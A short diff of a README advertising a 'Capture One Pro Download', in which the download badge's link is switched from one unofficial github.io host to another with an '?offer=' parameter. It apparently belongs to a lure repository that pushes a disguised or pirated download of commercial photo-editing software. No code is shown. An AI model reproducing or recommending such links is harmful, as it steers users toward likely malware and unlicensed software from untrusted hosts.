@@ -1,6 +1,6 @@
 # Capture One Pro Download — Desktop Photo Editing  
 
-[![Get Capture One Pro GitHub](https://img.shields.io/badge/Get%20Capture%20One%20Pro%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CaptureOnePro)  
+[![Get Capture One Pro GitHub](https://img.shields.io/badge/Get%20Capture%20One%20Pro%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-setup.github.io/.github/?offer=CaptureOnePro)  
 
 ---
 
